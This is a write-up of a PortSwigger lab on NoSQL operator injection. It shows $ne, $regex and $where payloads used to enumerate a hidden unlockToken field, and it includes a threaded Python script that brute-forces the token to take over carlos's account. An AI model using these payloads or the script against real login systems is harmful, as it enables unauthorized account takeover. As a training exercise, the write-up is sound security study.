**Title:** Exploiting NoSQL Operator Injection to Extract Unknown Fields — PortSwigger Lab Writeup

**Description:**
This lab is about NoSQL operator injection. The goal is to log in as carlos.

**My Approach:**

*Step 1 — First attempt (wrong path):*
First, I injected `{"$ne":"1"}` into the password field and got "Account locked" — this confirmed the injection worked. Then I spent about 30 minutes to 1 hour trying to brute-force Carlos's password using `$regex`. I wrote a Python script with threading because Burp Intruder Community edition is very slow. I got the full password, but when I tried to log in, the account was still locked. So brute-forcing the password was useless.

*Step 2 — Finding the hidden field:*
I remembered from a previous lab that I can use `$where` to extract field names. I used `"$where":"Object.keys(this)[2].match('^.{x}y.*')"` to enumerate the fields character by character. Index `[0]` was `username`, `[1]` was `password`, and `[2]` was a field called `unlockToken`. I confirmed this by trying with no index — the response showed `usernamepasswordunlockToken`.

*Step 3 — Extracting the token value:*
I used `$regex` to brute-force the value of `unlockToken` character by character, using a similar Python script with threading.

*Step 4 — Solving the lab:*
I sent a request to `/forgot-password?unlockToken=<extracted value>`, opened the response in Burp's browser, and reset Carlos's password. Then I logged in as carlos.

**Why I used Python instead of Burp Intruder:**
Burp Intruder Community edition is very slow. Python with threading is much faster and I can modify anything I want.

**Key Takeaway:**
The database field name (`unlockToken`) happened to be the same as the query parameter name on the `/forgot-password` endpoint. In real life, this wouldn't always be the case — the parameter name could be different from the field name in the database.

**Note on AI usage:**
I wrote the brute-force logic concept myself (what to inject, what response to check, how to loop through characters). AI helped me with about 50–75% of the Python code — mostly syntax and structure like threading, requests, and string formatting. I adjusted the code to fit my needs.

**Code snippet:**
```python
import json
import requests
import string
import threading
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DOMAIN = "0a280005031a37aa80ad1c8500320084.web-security-academy.net"
URL = f"https://{DOMAIN}/login"
method = "POST"
headers = {
    "Cookie": "session=lurWpybLXOtwCOTcfa9lmHxbE2OK0k7U",
    "Content-Type": "application/json",
}
characters = string.ascii_lowercase + string.digits

def brute_position(x):
    for y in characters:
        parameters = {
            "username": "carlos",
            "password": {"$ne": "1"},
            "unlockToken": {"$regex": f"^.{{{x}}}{y}.*"}
        }
        response = requests.request(
            method, URL, headers=headers, json=parameters,
            verify=False, proxies={"http": None, "https": None}
        )
        if "Account locked: please reset your password" in response.text:
            print(f"Position {x}, character '{y}' is correct")
            return y

threads = []
for x in range(1, 15):
    t = threading.Thread(target=brute_position, args=(x,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```
